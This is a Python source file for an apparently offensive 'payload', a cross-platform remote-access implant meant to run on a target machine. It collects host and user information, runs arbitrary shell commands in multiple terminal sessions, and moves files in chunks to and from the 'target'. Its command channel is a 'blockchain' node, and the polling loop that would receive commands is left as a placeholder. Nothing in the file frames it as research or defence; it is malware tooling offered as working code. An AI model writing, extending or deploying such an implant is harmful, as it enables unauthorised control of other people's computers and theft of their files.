#!/usr/bin/env python3
"""
FSDP Enhanced Payload - Cross-Platform
Supports: Windows, Linux
Features: Blockchain communication, Multiple terminals, File transfer, Session persistence
"""

import sys
import os
import json
import hashlib
import time
import subprocess
import platform
import socket
import threading
import base64
import uuid
import traceback
from typing import Dict, List, Optional, Any
from datetime import datetime
from pathlib import Path

# ============================================================================
# CONFIGURATION
# ============================================================================

DEBUG = True  # Set to False in production
BLOCKCHAIN_NODE = "localhost:5000"  # Will be configured during generation
PAYLOAD_ID = str(uuid.uuid4())
POLL_INTERVAL = 0.5  # Poll blockchain every 500ms for real-time performance

# ============================================================================
# LOGGING SYSTEM
# ============================================================================

class Logger:
    """Debug logging system"""
    
    def __init__(self, debug: bool = True):
        self.debug_enabled = debug
        self.log_file = None
        if debug:
            log_dir = Path.home() / ".fsdp_logs"
            log_dir.mkdir(exist_ok=True)
            self.log_file = log_dir / f"payload_{PAYLOAD_ID[:8]}.log"
    
    def _log(self, level: str, message: str):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_line = f"[{timestamp}] [{level}] [FSDP-Payload] {message}"
        
        if self.debug_enabled:
            print(log_line, file=sys.stderr)
            if self.log_file:
                try:
                    with open(self.log_file, 'a') as f:
                        f.write(log_line + '\n')
                except:
                    pass
    
    def debug(self, message: str):
        if self.debug_enabled:
            self._log("DEBUG", message)
    
    def info(self, message: str):
        self._log("INFO", message)
    
    def warning(self, message: str):
        self._log("WARNING", message)
    
    def error(self, message: str):
        self._log("ERROR", message)
        
    def exception(self, message: str):
        self._log("ERROR", f"{message}\n{traceback.format_exc()}")

logger = Logger(DEBUG)

# ============================================================================
# SYSTEM INFORMATION
# ============================================================================

def get_system_info() -> Dict[str, Any]:
    """Collect comprehensive system information"""
    try:
        hostname = socket.gethostname()
        try:
            ip_address = socket.gethostbyname(hostname)
        except:
            ip_address = "unknown"
        
        info = {
            'payload_id': PAYLOAD_ID,
            'hostname': hostname,
            'ip_address': ip_address,
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
            'home_directory': str(Path.home()),
            'current_directory': os.getcwd(),
        }
        
        logger.debug(f"System info collected: {json.dumps(info, indent=2)}")
        return info
        
    except Exception as e:
        logger.exception(f"Failed to get system info: {e}")
        return {'payload_id': PAYLOAD_ID, 'error': str(e)}

# ============================================================================
# TERMINAL MANAGEMENT
# ============================================================================

class IsolatedTerminal:
    """
    Isolated terminal instance
    Each terminal maintains its own state, environment, and working directory
    """
    
    def __init__(self, terminal_id: str):
        self.terminal_id = terminal_id
        self.current_dir = str(Path.home())
        self.env = os.environ.copy()
        self.is_active = True
        self.command_history: List[str] = []
        self.created_at = time.time()
        logger.info(f"Terminal created: {terminal_id}")
    
    def execute_command(self, command: str) -> Dict[str, Any]:
        """
        Execute a command in this isolated terminal
        Supports: cd, environment variables, shell commands
        """
        try:
            logger.debug(f"Terminal {self.terminal_id[:8]} executing: {command[:100]}")
            self.command_history.append(command)
            
            # Handle cd command specially
            if command.strip().startswith('cd '):
                return self._handle_cd(command.strip()[3:].strip())
            
            # Handle environment variable setting
            if '=' in command and not command.startswith('echo'):
                parts = command.split('=', 1)
                if len(parts) == 2 and ' ' not in parts[0]:
                    var_name = parts[0].strip()
                    var_value = parts[1].strip().strip('"').strip("'")
                    self.env[var_name] = var_value
                    logger.debug(f"Set env var: {var_name}={var_value}")
                    return {
                        'output': f'{var_name}={var_value}\n',
                        'error': '',
                        'exit_code': 0,
                        'cwd': self.current_dir
                    }
            
            # Execute command
            start_time = time.time()
            
            # Determine shell based on platform
            if platform.system() == 'Windows':
                shell = True
                executable = None
            else:
                shell = True
                executable = '/bin/bash'
            
            process = subprocess.Popen(
                command,
                shell=shell,
                executable=executable,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self.current_dir,
                env=self.env
            )
            
            # Wait for command with timeout
            try:
                stdout, stderr = process.communicate(timeout=60)
                exit_code = process.returncode
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                exit_code = -1
                stderr = b'Command timeout (60s)\n' + stderr
            
            execution_time = time.time() - start_time
            
            result = {
                'output': stdout.decode('utf-8', errors='ignore'),
                'error': stderr.decode('utf-8', errors='ignore'),
                'exit_code': exit_code,
                'cwd': self.current_dir,
                'execution_time': execution_time
            }
            
            logger.debug(f"Command completed in {execution_time:.2f}s with exit code {exit_code}")
            return result
            
        except Exception as e:
            logger.exception(f"Command execution failed: {e}")
            return {
                'output': '',
                'error': f'Exception: {str(e)}',
                'exit_code': -1,
                'cwd': self.current_dir
            }
    
    def _handle_cd(self, path: str) -> Dict[str, Any]:
        """Handle directory change command"""
        try:
            if path == '~' or path == '':
                target_dir = str(Path.home())
            elif path == '-':
                # Go back to previous directory (simplified)
                target_dir = str(Path.home())
            else:
                if os.path.isabs(path):
                    target_dir = path
                else:
                    target_dir = os.path.join(self.current_dir, path)
                
                target_dir = os.path.abspath(target_dir)
            
            if os.path.isdir(target_dir):
                self.current_dir = target_dir
                logger.debug(f"Changed directory to: {target_dir}")
                return {
                    'output': '',
                    'error': '',
                    'exit_code': 0,
                    'cwd': self.current_dir
                }
            else:
                error_msg = f'Directory not found: {path}'
                logger.warning(error_msg)
                return {
                    'output': '',
                    'error': error_msg,
                    'exit_code': 1,
                    'cwd': self.current_dir
                }
        except Exception as e:
            logger.exception(f"CD command failed: {e}")
            return {
                'output': '',
                'error': str(e),
                'exit_code': 1,
                'cwd': self.current_dir
            }
    
    def get_info(self) -> Dict[str, Any]:
        """Get terminal information"""
        return {
            'terminal_id': self.terminal_id,
            'current_dir': self.current_dir,
            'is_active': self.is_active,
            'command_count': len(self.command_history),
            'created_at': self.created_at,
            'uptime': time.time() - self.created_at
        }

# ============================================================================
# TERMINAL MANAGER
# ============================================================================

class TerminalManager:
    """Manages multiple isolated terminals"""
    
    def __init__(self):
        self.terminals: Dict[str, IsolatedTerminal] = {}
        self.lock = threading.Lock()
        logger.info("Terminal Manager initialized")
    
    def create_terminal(self, terminal_id: str) -> bool:
        """Create a new isolated terminal"""
        with self.lock:
            if terminal_id in self.terminals:
                logger.warning(f"Terminal already exists: {terminal_id}")
                return False
            
            self.terminals[terminal_id] = IsolatedTerminal(terminal_id)
            logger.info(f"Terminal created: {terminal_id}")
            return True
    
    def execute_command(self, terminal_id: str, command: str) -> Optional[Dict[str, Any]]:
        """Execute command in specific terminal"""
        terminal = self.terminals.get(terminal_id)
        if terminal:
            return terminal.execute_command(command)
        else:
            logger.error(f"Terminal not found: {terminal_id}")
            return None
    
    def close_terminal(self, terminal_id: str) -> bool:
        """Close a terminal"""
        with self.lock:
            if terminal_id in self.terminals:
                self.terminals[terminal_id].is_active = False
                del self.terminals[terminal_id]
                logger.info(f"Terminal closed: {terminal_id}")
                return True
            return False
    
    def list_terminals(self) -> List[Dict[str, Any]]:
        """List all active terminals"""
        return [t.get_info() for t in self.terminals.values()]

# ============================================================================
# FILE TRANSFER HANDLER
# ============================================================================

class FileTransferHandler:
    """
    Handles chunked file transfers with verification
    Chunk size: 4MB
    """
    
    CHUNK_SIZE = 4 * 1024 * 1024  # 4MB
    
    def __init__(self):
        self.transfers: Dict[str, Dict[str, Any]] = {}
        self.lock = threading.Lock()
        logger.info("File Transfer Handler initialized")
    
    def start_download(self, transfer_id: str, file_path: str) -> Dict[str, Any]:
        """Start downloading a file from target"""
        try:
            if not os.path.exists(file_path):
                return {'success': False, 'error': 'File not found'}
            
            file_size = os.path.getsize(file_path)
            total_chunks = (file_size + self.CHUNK_SIZE - 1) // self.CHUNK_SIZE
            
            # Calculate file hash
            file_hash = self._calculate_file_hash(file_path)
            
            with self.lock:
                self.transfers[transfer_id] = {
                    'file_path': file_path,
                    'file_name': os.path.basename(file_path),
                    'file_size': file_size,
                    'total_chunks': total_chunks,
                    'file_hash': file_hash,
                    'current_chunk': 0,
                    'started_at': time.time()
                }
            
            logger.info(f"Download started: {file_path} ({file_size} bytes, {total_chunks} chunks)")
            
            return {
                'success': True,
                'file_name': os.path.basename(file_path),
                'file_size': file_size,
                'total_chunks': total_chunks,
                'file_hash': file_hash
            }
            
        except Exception as e:
            logger.exception(f"Failed to start download: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_chunk(self, transfer_id: str, chunk_index: int) -> Optional[Dict[str, Any]]:
        """Get a specific chunk"""
        transfer = self.transfers.get(transfer_id)
        if not transfer:
            logger.error(f"Transfer not found: {transfer_id}")
            return None
        
        try:
            file_path = transfer['file_path']
            
            with open(file_path, 'rb') as f:
                f.seek(chunk_index * self.CHUNK_SIZE)
                chunk_data = f.read(self.CHUNK_SIZE)
            
            chunk_hash = hashlib.sha256(chunk_data).hexdigest()
            chunk_data_b64 = base64.b64encode(chunk_data).decode('utf-8')
            
            logger.debug(f"Chunk {chunk_index}/{transfer['total_chunks']} sent for {transfer_id[:8]}")
            
            return {
                'chunk_index': chunk_index,
                'chunk_data': chunk_data_b64,
                'chunk_hash': chunk_hash,
                'chunk_size': len(chunk_data)
            }
            
        except Exception as e:
            logger.exception(f"Failed to get chunk: {e}")
            return None
    
    def start_upload(self, transfer_id: str, file_name: str, file_size: int, 
                     total_chunks: int, file_hash: str) -> Dict[str, Any]:
        """Start receiving a file upload"""
        try:
            # Create uploads directory
            upload_dir = Path.home() / ".fsdp_uploads"
            upload_dir.mkdir(exist_ok=True)
            
            file_path = upload_dir / file_name
            
            with self.lock:
                self.transfers[transfer_id] = {
                    'file_path': str(file_path),
                    'file_name': file_name,
                    'file_size': file_size,
                    'total_chunks': total_chunks,
                    'file_hash': file_hash,
                    'received_chunks': set(),
                    'started_at': time.time()
                }
            
            logger.info(f"Upload started: {file_name} ({file_size} bytes, {total_chunks} chunks)")
            
            return {'success': True}
            
        except Exception as e:
            logger.exception(f"Failed to start upload: {e}")
            return {'success': False, 'error': str(e)}
    
    def receive_chunk(self, transfer_id: str, chunk_index: int, 
                     chunk_data_b64: str, chunk_hash: str) -> Dict[str, Any]:
        """Receive and save a chunk"""
        transfer = self.transfers.get(transfer_id)
        if not transfer:
            return {'success': False, 'error': 'Transfer not found'}
        
        try:
            # Decode chunk data
            chunk_data = base64.b64decode(chunk_data_b64)
            
            # Verify chunk hash
            calculated_hash = hashlib.sha256(chunk_data).hexdigest()
            if calculated_hash != chunk_hash:
                logger.error(f"Chunk hash mismatch for {transfer_id[:8]} chunk {chunk_index}")
                return {'success': False, 'error': 'Hash verification failed'}
            
            # Write chunk to file
            file_path = transfer['file_path']
            mode = 'r+b' if os.path.exists(file_path) else 'wb'
            
            with open(file_path, mode) as f:
                f.seek(chunk_index * self.CHUNK_SIZE)
                f.write(chunk_data)
            
            # Mark chunk as received
            transfer['received_chunks'].add(chunk_index)
            
            progress = (len(transfer['received_chunks']) / transfer['total_chunks']) * 100
            logger.debug(f"Chunk {chunk_index} received for {transfer_id[:8]} ({progress:.1f}% complete)")
            
            # Check if transfer is complete
            if len(transfer['received_chunks']) == transfer['total_chunks']:
                # Verify complete file
                file_hash = self._calculate_file_hash(file_path)
                if file_hash == transfer['file_hash']:
                    logger.info(f"Upload completed successfully: {transfer['file_name']}")
                    return {'success': True, 'complete': True, 'verified': True}
                else:
                    logger.error(f"File hash verification failed for {transfer_id[:8]}")
                    return {'success': True, 'complete': True, 'verified': False}
            
            return {'success': True, 'complete': False}
            
        except Exception as e:
            logger.exception(f"Failed to receive chunk: {e}")
            return {'success': False, 'error': str(e)}
    
    def _calculate_file_hash(self, file_path: str) -> str:
        """Calculate SHA-256 hash of file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

# ============================================================================
# MAIN PAYLOAD CLASS
# ============================================================================

class FSDPPayload:
    """Main FSDP Payload - Orchestrates all components"""
    
    def __init__(self):
        self.running = False
        self.terminal_manager = TerminalManager()
        self.file_handler = FileTransferHandler()
        self.session_id: Optional[str] = None
        self.admin_id: Optional[str] = None
        self.last_heartbeat = time.time()
        logger.info("FSDP Payload initialized")
    
    def start(self):
        """Start the payload"""
        logger.info("=" * 60)
        logger.info("FSDP Payload Starting")
        logger.info("=" * 60)
        
        self.running = True
        
        # Get and log system info
        sys_info = get_system_info()
        logger.info(f"Payload ID: {PAYLOAD_ID}")
        logger.info(f"Platform: {sys_info.get('platform')}/{sys_info.get('architecture')}")
        logger.info(f"Hostname: {sys_info.get('hostname')}")
        logger.info(f"IP Address: {sys_info.get('ip_address')}")
        logger.info(f"Debug Mode: {DEBUG}")
        
        # Connect to blockchain
        logger.info(f"Connecting to blockchain node: {BLOCKCHAIN_NODE}")
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        # Main command processing loop
        logger.info("Entering main loop...")
        while self.running:
            try:
                # TODO: Poll blockchain for commands
                # For now, this is a placeholder that would connect to the actual blockchain
                
                time.sleep(POLL_INTERVAL)
                
            except KeyboardInterrupt:
                logger.info("Received interrupt signal")
                self.stop()
                break
            except Exception as e:
                logger.exception(f"Error in main loop: {e}")
                time.sleep(5)
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats"""
        while self.running:
            try:
                self.last_heartbeat = time.time()
                logger.debug("Heartbeat sent")
                time.sleep(30)  # Send heartbeat every 30 seconds
            except Exception as e:
                logger.exception(f"Heartbeat error: {e}")
    
    def stop(self):
        """Stop the payload"""
        logger.info("Stopping FSDP Payload...")
        self.running = False
        
        # Close all terminals
        for terminal_id in list(self.terminal_manager.terminals.keys()):
            self.terminal_manager.close_terminal(terminal_id)
        
        logger.info("FSDP Payload stopped")

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    logger.info("=" * 60)
    logger.info("FSDP Enhanced Payload")
    logger.info("=" * 60)
    logger.info(f"Version: 1.0.0")
    logger.info(f"Platform: {platform.system()}/{platform.machine()}")
    logger.info(f"Python: {platform.python_version()}")
    logger.info(f"Debug: {DEBUG}")
    logger.info("=" * 60)
    
    payload = FSDPPayload()
    
    try:
        payload.start()
    except Exception as e:
        logger.exception(f"Fatal error: {e}")
        sys.exit(1)
    finally:
        logger.info("Payload terminated")

